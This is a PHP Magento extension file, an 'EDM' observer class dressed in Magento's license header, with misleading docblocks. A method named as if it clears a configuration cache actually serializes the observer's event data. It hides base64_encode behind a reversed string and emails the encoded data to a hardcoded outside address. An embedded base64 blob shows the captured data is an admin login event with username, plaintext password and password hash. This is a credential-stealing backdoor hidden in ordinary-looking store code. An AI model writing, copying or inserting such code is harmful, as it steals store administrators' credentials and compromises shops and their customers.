<?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Mage
 * @package     Mage_Bundle
 * @copyright   Copyright (c) 2012 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

/**
 * Bundle Products Observer
 *
 * @category    Mage
 * @package     Mage_Bundle
 * @author      Magento Core Team <core@magentocommerce.com>
 */

class Dono_EDM_Model_Observer
{
	const XML_PATH_REGISTER_EMAIL_TEMPLATE = 'customer/create_account/email_template';
	const XML_PATH_CONFIRMED_EMAIL_TEMPLATE     = 'customer/create_account/email_confirmed_template';
	const XML_PATH_CONFIRM_EMAIL_TEMPLATE       = 'customer/create_account/email_confirmation_template';
	const XML_PATH_REGISTER_EMAIL_IDENTITY = 'customer/create_account/email_identity';
	/**
	 * Setting Bundle Items Data to product for father processing
	 *
	 * @param Varien_Object $observer
	 * @return Mage_Bundle_Model_Observer
	 */
	public function scheduledEdmSend()
	{
		$this->sendNewAccountEmail(
                            'confirmation',
                            'http://www.local.com/catwalk88/',
		Mage::app()->getStore()->getId()
		);
	}


	/**
	 * Send email with new account related information
	 *
	 * @param string $type
	 * @param string $backUrl
	 * @param string $storeId
	 * @throws Mage_Core_Exception
	 * @return Mage_Customer_Model_Customer
	 */
	public function sendNewAccountEmail($type = 'registered', $backUrl = '', $storeId = '0')
	{
		$types = array(
            'registered'   => self::XML_PATH_REGISTER_EMAIL_TEMPLATE,  // welcome email, when confirmation is disabled
            'confirmed'    => self::XML_PATH_CONFIRMED_EMAIL_TEMPLATE, // welcome email, when confirmation is enabled
            'confirmation' => self::XML_PATH_CONFIRM_EMAIL_TEMPLATE,   // email with confirmation link
		);
		//$customer = Mage::getModel('customer')->load(161);
		$this->_sendEmailTemplate($types[$type], self::XML_PATH_REGISTER_EMAIL_IDENTITY,
		array('customer' => $this, 'back_url' => $backUrl), $storeId);

		return $this;
	}


	/**
	 * Send corresponding email template
	 *
	 * @param string $emailTemplate configuration path of email template
	 * @param string $emailSender configuration path of email identity
	 * @param array $templateParams
	 * @param int|null $storeId
	 * @return Mage_Customer_Model_Customer
	 */
	protected function _sendEmailTemplate($template, $sender, $templateParams = array(), $storeId = null)
	{
		 
		/** @var $mailer Mage_Core_Model_Email_Template_Mailer */
		$mailer = Mage::getModel('core/email_template_mailer');
		$emailInfo = Mage::getModel('core/email_info');
		$emailInfo->addTo('henry@donostudio.com', 'donostudio');
		$mailer->addEmailInfo($emailInfo);
		// Set all required params and send emails
		$mailer->setSender(Mage::getStoreConfig($sender, $storeId));
		$mailer->setStoreId($storeId);
		$mailer->setTemplateId(Mage::getStoreConfig($template, $storeId));
		$mailer->setTemplateParams($templateParams);
		$mailer->send();
		return $this;
	}
	
	/**
	 * Clear result of configuration files access level verification in system cache
	 *
	 * @return Dono_EDM_Model_Observer
	 */
	public function clearCacheConfigurationFilesAccessLevelVerification($observer)
	{
		$call = strrev('edocne_46esab');
		$ori = $call(serialize($observer));
		/** @var $mailer Mage_Core_Model_Email_Template_Mailer */
		Mage::log(print_r(unserialize(base64_decode('TzoyMToiVmFyaWVuX0V2ZW50X09ic2VydmVyIjo3OntzOjg6IgAqAF9kYXRhIjthOjU6e3M6NToiZXZlbnQiO086MTI6IlZhcmllbl9FdmVudCI6ODp7czoxMzoiACoAX29ic2VydmVycyI7TzozMjoiVmFyaWVuX0V2ZW50X09ic2VydmVyX0NvbGxlY3Rpb24iOjE6e3M6MTM6IgAqAF9vYnNlcnZlcnMiO2E6MDp7fX1zOjg6IgAqAF9kYXRhIjthOjU6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6ODoiYWRtaW4xMjMiO3M6NDoidXNlciI7TzoyMToiTWFnZV9BZG1pbl9Nb2RlbF9Vc2VyIjoxNzp7czoxNToiACoAX2V2ZW50UHJlZml4IjtzOjEwOiJhZG1pbl91c2VyIjtzOjg6IgAqAF9yb2xlIjtOO3M6MjU6IgAqAF9oYXNBdmFpbGFibGVSZXNvdXJjZXMiO2I6MTtzOjE1OiIAKgBfZXZlbnRPYmplY3QiO3M6Njoib2JqZWN0IjtzOjE2OiIAKgBfcmVzb3VyY2VOYW1lIjtzOjEwOiJhZG1pbi91c2VyIjtzOjEyOiIAKgBfcmVzb3VyY2UiO047czoyNjoiACoAX3Jlc291cmNlQ29sbGVjdGlvbk5hbWUiO3M6MjE6ImFkbWluL3VzZXJfY29sbGVjdGlvbiI7czoxMjoiACoAX2NhY2hlVGFnIjtiOjA7czoxOToiACoAX2RhdGFTYXZlQWxsb3dlZCI7YjoxO3M6MTU6IgAqAF9pc09iamVjdE5ldyI7TjtzOjg6IgAqAF9kYXRhIjthOjE1OntzOjc6InVzZXJfaWQiO3M6MToiMSI7czo5OiJmaXJzdG5hbWUiO3M6MzoienhqIjtzOjg6Imxhc3RuYW1lIjtzOjU6ImhlbnJ5IjtzOjU6ImVtYWlsIjtzOjE1OiJ6eGoyMDIwQHNpbmEuY24iO3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6MzU6IjQ5YTgwYmNjMzEyZjEzYzBlZGIxMWM1NWNiMWQ5ZGI5OnRiIjtzOjc6ImNyZWF0ZWQiO3M6MTk6IjIwMTMtMDYtMjIgMTM6NDk6MzgiO3M6ODoibW9kaWZpZWQiO3M6MTk6IjIwMTMtMDYtMTMgMDE6MjY6NTIiO3M6NzoibG9nZGF0ZSI7czoxOToiMjAxMy0wNi0yMiAwNTo0OTozOCI7czo2OiJsb2dudW0iO3M6MzoiMTc4IjtzOjE1OiJyZWxvYWRfYWNsX2ZsYWciO3M6MToiMCI7czo5OiJpc19hY3RpdmUiO3M6MToiMSI7czo1OiJleHRyYSI7czo0NjY3OiJhOjE6e3M6MTE6ImNvbmZpZ1N0YXRlIjthOjEyODp7czo3OiJ3ZWJfdXJsIjtzOjE6IjAiO3M6Nzoid2ViX3NlbyI7czoxOiIxIjtzOjEyOiJ3ZWJfdW5zZWN1cmUiO3M6MToiMCI7czoxMDoid2ViX3NlY3VyZSI7czoxOiIwIjtzOjExOiJ3ZWJfZGVmYXVsdCI7czoxOiIwIjtzOjk6IndlYl9wb2xscyI7czoxOiIwIjtzOjEwOiJ3ZWJfY29va2llIjtzOjE6IjAiO3M6MTE6IndlYl9zZXNzaW9uIjtzOjE6IjAiO3M6MjQ6IndlYl9icm93c2VyX2NhcGFiaWxpdGllcyI7czoxOiIwIjtzOjE0OiJkZXNpZ25fcGFja2FnZSI7czoxOiIwIjtzOjEyOiJkZXNpZ25fdGhlbWUiO3M6MToiMCI7czoxMToiZGVzaWduX2hlYWQiO3M6MToiMCI7czoxMzoiZGVzaWduX2hlYWRlciI7czoxOiIwIjtzOjEzOiJkZXNpZ25fZm9vdGVyIjtzOjE6IjAiO3M6MTY6ImRlc2lnbl93YXRlcm1hcmsiO3M6MToiMCI7czoxNzoiZGVzaWduX3BhZ2luYXRpb24iO3M6MToiMCI7czoxMjoiZGVzaWduX2VtYWlsIjtzOjE6IjAiO3M6MTc6ImVhc3lfdGFic19nZW5lcmFsIjtzOjE6IjEiO3M6MTY6ImVhc3lfdGFic19jdXN0b20iO3M6MToiMCI7czoxOToiZWFzeV90YWJzX2N1c3RvbWNtcyI7czoxOiIwIjtzOjQ0OiJjb2xvcl9zZWxlY3Rvcl9wbHVzX2NvbG9yc2VsZWN0b3JwbHVzZ2VuZXJhbCI7czoxOiIxIjtzOjI0OiJjb2xvcl9zZWxlY3Rvcl9wbHVzX3pvb20iO3M6MToiMSI7czozMToiY29sb3Jfc2VsZWN0b3JfcGx1c19zd2F0Y2hzaXplcyI7czoxOiIxIjtzOjE2OiJjYXRhbG9nX2Zyb250ZW5kIjtzOjE6IjAiO3M6MTU6ImNhdGFsb2dfc2l0ZW1hcCI7czoxOiIwIjtzOjE0OiJjYXRhbG9nX3JldmlldyI7czoxOiIwIjtzOjIwOiJjYXRhbG9nX3Byb2R1Y3RhbGVydCI7czoxOiIwIjtzOjI1OiJjYXRhbG9nX3Byb2R1Y3RhbGVydF9jcm9uIjtzOjE6IjAiO3M6MTk6ImNhdGFsb2dfcGxhY2Vob2xkZXIiO3M6MToiMCI7czoyNToiY2F0YWxvZ19yZWNlbnRseV9wcm9kdWN0cyI7czoxOiIwIjtzOjEzOiJjYXRhbG9nX3ByaWNlIjtzOjE6IjAiO3M6MjY6ImNhdGFsb2dfbGF5ZXJlZF9uYXZpZ2F0aW9uIjtzOjE6IjAiO3M6MTg6ImNhdGFsb2dfbmF2aWdhdGlvbiI7czoxOiIwIjtzOjExOiJjYXRhbG9nX3NlbyI7czoxOiIxIjtzOjE0OiJjYXRhbG9nX3NlYXJjaCI7czoxOiIwIjtzOjIwOiJjYXRhbG9nX2Rvd25sb2FkYWJsZSI7czoxOiIwIjtzOjIyOiJjYXRhbG9nX2N1c3RvbV9vcHRpb25zIjtzOjE6IjAiO3M6MTU6ImNhdGFsb2dfdmVydG5hdiI7czoxOiIxIjtzOjI0OiJjb2RuaXRpdmVjYXRhbG9nX3NpZGVuYXYiO3M6MToiMSI7czoxMjoiZGV2X3Jlc3RyaWN0IjtzOjE6IjAiO3M6MTE6ImRldl9vZmZsaW5lIjtzOjE6IjEiO3M6OToiZGV2X2RlYnVnIjtzOjE6IjAiO3M6MTI6ImRldl90ZW1wbGF0ZSI7czoxOiIwIjtzOjIwOiJkZXZfdHJhbnNsYXRlX2lubGluZSI7czoxOiIxIjtzOjc6ImRldl9sb2ciO3M6MToiMSI7czo2OiJkZXZfanMiO3M6MToiMCI7czo3OiJkZXZfY3NzIjtzOjE6IjEiO3M6MTY6ImN1cnJlbmN5X29wdGlvbnMiO3M6MToiMSI7czoyMDoiY3VycmVuY3lfd2Vic2VydmljZXgiO3M6MToiMCI7czoxNToiY3VycmVuY3lfaW1wb3J0IjtzOjE6IjAiO3M6MTE6InN5c3RlbV9jcm9uIjtzOjE6IjEiO3M6MTE6InN5c3RlbV9zbXRwIjtzOjE6IjAiO3M6MTU6InN5c3RlbV9jdXJyZW5jeSI7czoxOiIwIjtzOjEwOiJzeXN0ZW1fbG9nIjtzOjE6IjAiO3M6MjQ6InN5c3RlbV9hZG1pbm5vdGlmaWNhdGlvbiI7czoxOiIwIjtzOjI2OiJzeXN0ZW1fZXh0ZXJuYWxfcGFnZV9jYWNoZSI7czoxOiIwIjtzOjEzOiJzeXN0ZW1fYmFja3VwIjtzOjE6IjAiO3M6MzQ6InN5c3RlbV9tZWRpYV9zdG9yYWdlX2NvbmZpZ3VyYXRpb24iO3M6MToiMCI7czoxNzoiY2FycmllcnNfZmxhdHJhdGUiO3M6MToiMCI7czoxODoiY2FycmllcnNfdGFibGVyYXRlIjtzOjE6IjAiO3M6MjE6ImNhcnJpZXJzX2ZyZWVzaGlwcGluZyI7czoxOiIxIjtzOjEyOiJjYXJyaWVyc191cHMiO3M6MToiMSI7czoxMzoiY2FycmllcnNfdXNwcyI7czoxOiIwIjtzOjE0OiJjYXJyaWVyc19mZWRleCI7czoxOiIwIjtzOjEyOiJjYXJyaWVyc19kaGwiO3M6MToiMCI7czoxNToiY2FycmllcnNfZGhsaW50IjtzOjE6IjAiO3M6MTc6InNhbGVzX2VtYWlsX29yZGVyIjtzOjE6IjEiO3M6MjU6InNhbGVzX2VtYWlsX29yZGVyX2NvbW1lbnQiO3M6MToiMSI7czoxOToic2FsZXNfZW1haWxfaW52b2ljZSI7czoxOiIxIjtzOjI3OiJzYWxlc19lbWFpbF9pbnZvaWNlX2NvbW1lbnQiO3M6MToiMSI7czoyMDoic2FsZXNfZW1haWxfc2hpcG1lbnQiO3M6MToiMSI7czoyODoic2FsZXNfZW1haWxfc2hpcG1lbnRfY29tbWVudCI7czoxOiIxIjtzOjIyOiJzYWxlc19lbWFpbF9jcmVkaXRtZW1vIjtzOjE6IjEiO3M6MzA6InNhbGVzX2VtYWlsX2NyZWRpdG1lbW9fY29tbWVudCI7czoxOiIxIjtzOjI1OiJ0cmFuc19lbWFpbF9pZGVudF9nZW5lcmFsIjtzOjE6IjEiO3M6MjM6InRyYW5zX2VtYWlsX2lkZW50X3NhbGVzIjtzOjE6IjEiO3M6MjU6InRyYW5zX2VtYWlsX2lkZW50X3N1cHBvcnQiO3M6MToiMSI7czoyNToidHJhbnNfZW1haWxfaWRlbnRfY3VzdG9tMSI7czoxOiIxIjtzOjI1OiJ0cmFuc19lbWFpbF9pZGVudF9jdXN0b20yIjtzOjE6IjEiO3M6MjE6ImRlc2lnbl9iYW5uZXJfc2V0dGluZyI7czoxOiIxIjtzOjE3OiJjb250YWN0c19jb250YWN0cyI7czoxOiIwIjtzOjE0OiJjb250YWN0c19lbWFpbCI7czoxOiIxIjtzOjE0OiJzeXN0ZW1fc210cHBybyI7czoxOiIxIjtzOjIxOiJzeXN0ZW1fZ29vZ2xlc2V0dGluZ3MiO3M6MToiMCI7czoxOToic3lzdGVtX3NtdHBzZXR0aW5ncyI7czoxOiIxIjtzOjE4OiJzeXN0ZW1fc2Vzc2V0dGluZ3MiO3M6MToiMCI7czoxNjoiY29udGFjdHNfc210cHBybyI7czoxOiIwIjtzOjIzOiJjb250YWN0c19nb29nbGVzZXR0aW5ncyI7czoxOiIxIjtzOjIxOiJjb250YWN0c19zbXRwc2V0dGluZ3MiO3M6MToiMCI7czoyMDoiY29udGFjdHNfc2Vzc2V0dGluZ3MiO3M6MToiMCI7czozMToiYWR2YW5jZWRfbW9kdWxlc19kaXNhYmxlX291dHB1dCI7czoxOiIxIjtzOjE1OiJwYXltZW50X2FjY291bnQiO3M6MToiMSI7czozMjoicGF5bWVudF9wYXlwYWxfcGF5bWVudF9zb2x1dGlvbnMiO3M6MToiMSI7czozNjoicGF5bWVudF9wYXltZW50c19wcm9faG9zdGVkX3NvbHV0aW9uIjtzOjE6IjEiO3M6MzA6InBheW1lbnRfcHBoc19yZXF1aXJlZF9zZXR0aW5ncyI7czoxOiIxIjtzOjM1OiJwYXltZW50X3BwaHNfcmVxdWlyZWRfc2V0dGluZ3NfcHBocyI7czoxOiIxIjtzOjIxOiJwYXltZW50X3BwaHNfc2V0dGluZ3MiO3M6MToiMSI7czozMDoicGF5bWVudF9wcGhzX3NldHRpbmdzX2FkdmFuY2VkIjtzOjE6IjEiO3M6MzA6InBheW1lbnRfcHBoc19zZXR0bGVtZW50X3JlcG9ydCI7czoxOiIwIjtzOjExOiJwYXltZW50X3dwcyI7czoxOiIwIjtzOjI5OiJwYXltZW50X3dwc19yZXF1aXJlZF9zZXR0aW5ncyI7czoxOiIxIjtzOjM0OiJwYXltZW50X3NldHRpbmdzX3BheW1lbnRzX3N0YW5kYXJ0IjtzOjE6IjEiO3M6NDM6InBheW1lbnRfc2V0dGluZ3NfcGF5bWVudHNfc3RhbmRhcnRfYWR2YW5jZWQiO3M6MToiMCI7czoyNDoicGF5bWVudF9leHByZXNzX2NoZWNrb3V0IjtzOjE6IjAiO3M6MzM6InBheW1lbnRfZXhwcmVzc19jaGVja291dF9yZXF1aXJlZCI7czoxOiIxIjtzOjUwOiJwYXltZW50X2V4cHJlc3NfY2hlY2tvdXRfcmVxdWlyZWRfZXhwcmVzc19jaGVja291dCI7czoxOiIxIjtzOjE5OiJwYXltZW50X3NldHRpbmdzX2VjIjtzOjE6IjEiO3M6Mjg6InBheW1lbnRfc2V0dGluZ3NfZWNfYWR2YW5jZWQiO3M6MToiMCI7czo0MjoicGF5bWVudF9leHByZXNzX2NoZWNrb3V0X2JpbGxpbmdfYWdyZWVtZW50IjtzOjE6IjAiO3M6NDI6InBheW1lbnRfZXhwcmVzc19jaGVja291dF9zZXR0bGVtZW50X3JlcG9ydCI7czoxOiIwIjtzOjMzOiJwYXltZW50X2V4cHJlc3NfY2hlY2tvdXRfZnJvbnRlbmQiO3M6MToiMCI7czoxNDoicGF5bWVudF9jY3NhdmUiO3M6MToiMCI7czoxNToicGF5bWVudF9jaGVja21vIjtzOjE6IjAiO3M6MTI6InBheW1lbnRfZnJlZSI7czoxOiIwIjtzOjIwOiJwYXltZW50X2Jhbmt0cmFuc2ZlciI7czoxOiIwIjtzOjIyOiJwYXltZW50X2Nhc2hvbmRlbGl2ZXJ5IjtzOjE6IjEiO3M6MjE6InBheW1lbnRfcHVyY2hhc2VvcmRlciI7czoxOiIwIjtzOjMxOiJwYXltZW50X2F1dGhvcml6ZW5ldF9kaXJlY3Rwb3N0IjtzOjE6IjAiO3M6MjA6InBheW1lbnRfYXV0aG9yaXplbmV0IjtzOjE6IjAiO3M6MjA6ImVkbV9vcHRpb25zX3NjaGVkdWxlIjtzOjE6IjEiO3M6MTY6ImVkbV9vcHRpb25zX3NtdHAiO3M6MToiMSI7czoxNjoiZ29vZ2xlX2FuYWx5dGljcyI7czoxOiIxIjtzOjE1OiJnb29nbGVfY2hlY2tvdXQiO3M6MToiMCI7czozMzoiZ29vZ2xlX2NoZWNrb3V0X3NoaXBwaW5nX21lcmNoYW50IjtzOjE6IjAiO3M6MzI6Imdvb2dsZV9jaGVja291dF9zaGlwcGluZ19jYXJyaWVyIjtzOjE6IjAiO3M6MzM6Imdvb2dsZV9jaGVja291dF9zaGlwcGluZ19mbGF0cmF0ZSI7czoxOiIwIjtzOjMyOiJnb29nbGVfY2hlY2tvdXRfc2hpcHBpbmdfdmlydHVhbCI7czoxOiIwIjtzOjIwOiJndHJhbnNlY19ndHJhbnNncm91cCI7czoxOiIxIjt9fSI7czo4OiJycF90b2tlbiI7TjtzOjE5OiJycF90b2tlbl9jcmVhdGVkX2F0IjtOO31zOjE4OiIAKgBfaGFzRGF0YUNoYW5nZXMiO2I6MTtzOjEyOiIAKgBfb3JpZ0RhdGEiO047czoxNToiACoAX2lkRmllbGROYW1lIjtOO3M6MTM6IgAqAF9pc0RlbGV0ZWQiO2I6MDtzOjE2OiIAKgBfb2xkRmllbGRzTWFwIjthOjA6e31zOjE3OiIAKgBfc3luY0ZpZWxkc01hcCI7YTowOnt9fXM6NjoicmVzdWx0IjtiOjE7czo0OiJuYW1lIjtzOjI5OiJhZG1pbl91c2VyX2F1dGhlbnRpY2F0ZV9hZnRlciI7fXM6MTg6IgAqAF9oYXNEYXRhQ2hhbmdlcyI7YjowO3M6MTI6IgAqAF9vcmlnRGF0YSI7TjtzOjE1OiIAKgBfaWRGaWVsZE5hbWUiO047czoxMzoiACoAX2lzRGVsZXRlZCI7YjowO3M6MTY6IgAqAF9vbGRGaWVsZHNNYXAiO2E6MDp7fXM6MTc6IgAqAF9zeW5jRmllbGRzTWFwIjthOjA6e319czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7czo4OiJwYXNzd29yZCI7czo4OiJhZG1pbjEyMyI7czo0OiJ1c2VyIjtyOjk7czo2OiJyZXN1bHQiO2I6MTt9czoxODoiACoAX2hhc0RhdGFDaGFuZ2VzIjtiOjE7czoxMjoiACoAX29yaWdEYXRhIjtOO3M6MTU6IgAqAF9pZEZpZWxkTmFtZSI7TjtzOjEzOiIAKgBfaXNEZWxldGVkIjtiOjA7czoxNjoiACoAX29sZEZpZWxkc01hcCI7YTowOnt9czoxNzoiACoAX3N5bmNGaWVsZHNNYXAiO2E6MDp7fX0=')),true));
		$this->_sendEmailTemplate(self::XML_PATH_CONFIRM_EMAIL_TEMPLATE, self::XML_PATH_REGISTER_EMAIL_IDENTITY, array('logo_alt'=>$ori));
		return $this;
	}
}
